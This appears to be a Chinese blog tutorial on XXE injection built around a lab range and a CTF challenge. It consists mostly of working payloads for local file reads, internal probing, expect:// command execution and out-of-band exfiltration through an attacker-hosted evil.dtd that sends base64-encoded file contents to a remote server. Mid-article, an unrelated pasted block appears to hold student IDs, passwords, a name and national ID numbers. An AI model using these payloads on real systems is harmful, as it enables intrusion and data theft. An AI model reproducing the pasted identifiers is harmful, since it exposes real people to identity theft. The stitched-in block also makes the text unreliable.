#### 前言

[![bGuFln.png](https://s4.ax1x.com/2022/03/02/bGuFln.png)](https://imgtu.com/i/bGuFln)

xxe漏洞在我为期不长的挖洞生涯中也没有遇到过，所以就想着总结一下，撰写此文以作为记录，加深自己对xxe漏洞的认识，实验靶场是xxe-lab和[[NCTF2019]Fake XML cookbook](https://buuoj.cn/challenges#[NCTF2019]Fake%20XML%20cookbook)这题。

#### 基本介绍

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素

对内声明

```xml
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
```

对外声明

```xml
<!DOCTYPE note SYSTEM "note.dtd">

<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

一般实体：<!ENTITY 实体名称 "实体的值">

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer "Bill Gates">
<!ENTITY copyright "Copyright W3School.com.cn">
]>

```

参数实体：<!ENTITY 实体名称 SYSTEM "URI">

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>
```

这里SYSTEM后面的url分为以下几种方式，利用协议攻击

协议如下：

![](https://z3.ax1x.com/2021/10/11/5Z4XSP.png)

![PHP其他协议](https://z3.ax1x.com/2021/10/11/5Zq3UU.png)

基本可以达到和SSRF一样的效果，探测内网端口(http/https)，DDOS，读取任意文件(file)，命令执行(expect)等

![](https://s4.ax1x.com/2021/12/28/Tr08EQ.png)

##### 读文件

```
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<x>&xxe;</x>
```



##### 内网探针或攻击内网应用

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY rabbit SYSTEM "http://3z5vcc.dnslog.cn" >
]>
<x>&rabbit;</x>
```



##### RCE

```
该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "expect://whoami" >
]>
<x>&xxe;</x>
```



##### 引入外部实体 dtd

```
<?xml version="1.0" ?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd">
%file;
]>
<x>&send;</x>
evil2.dtd:
<!ENTITY send SYSTEM "file:///d:/test.txt">
```





~~~
2019214324
A@2019gaokao
530381200111243510


2019214323
01090014
360313200101090014


1000002379
08290617
232125197208290617

王涵
2020222859
08230129
231121200208230129

示波器和长度测量
~~~

伪协议

~~~
<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=c:/windows/win.ini">
]>
<x>&xxe;</x>
~~~







##### 无回显-读取文件

```
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=test.txt">
<!ENTITY % dtd SYSTEM "http://192.168.0.103:8081/test.dtd">
%dtd;
%send;
]>
test.dtd：
<!ENTITY % payload
"<!ENTITY &#x25; send SYSTEM 'http://192.168.0.103:8081/?data=%file;'>"
>
%payload;
```

##### 协议-读文件（绕过）

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY [ <!ENTITY f SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php"> ]>
<x>&f;</x>
```

##### [XXEinjector](https://www.cnblogs.com/bmjoker/p/9614990.html)

具体参数自查

##### CTF

###### 读靶机文件

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [ 
<!ENTITY rabbit SYSTEM "file:///flag" >
]>
<user><username>&rabbit;</username><password>123</password></user>
```



###### 恶意引入外部参数实体

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://vps-ip/hack.dtd">
    %file;
]>
<test>&hhh;</test>
```



```
<!ENTITY hhh SYSTEM 'file:///etc/passwd'>
```

##### 无回显

###### OOB

先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。

```
<!DOCTYPE updateProfile [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php">
    <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd">
    %dtd;
    %send;
]>
```

evil.dtd的内容，内部的%号要进行实体编码成&#x25。

**`<!ENTITY % all    "<!ENTITY &#x25; send SYSTEM 'http://xxx.xxx.xxx/?data=%file;'>">%all;`

访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。